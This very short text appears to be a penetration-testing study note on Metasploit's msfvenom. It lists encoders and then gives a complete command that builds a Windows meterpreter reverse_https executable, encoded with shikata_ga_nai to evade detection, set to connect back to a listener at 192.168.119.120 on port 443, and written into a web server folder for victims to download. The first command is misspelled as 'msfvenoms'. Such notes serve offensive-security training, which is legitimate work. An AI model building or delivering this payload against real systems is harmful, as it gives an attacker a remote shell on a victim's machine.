msfvenoms --list encoders

#We encode a payload by passing the -e flag:

sudo msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x86/shikata_ga_nai -f exe -o /var/www/html/met.exe